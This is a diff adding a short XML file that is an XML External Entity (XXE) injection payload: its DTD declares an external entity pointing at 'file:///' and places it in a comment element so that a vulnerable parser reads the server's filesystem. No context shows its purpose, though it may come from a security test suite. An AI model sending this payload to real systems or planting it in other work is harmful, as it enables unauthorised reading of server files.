@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE comment [
+   <!ELEMENT comment (Activity)>
+   <!ELEMENT Activity (#PCDATA)>
+   <!ENTITY xxebrettw SYSTEM "file:///">
+]>
+<comment><text>&xxebrettw;</text></comment>
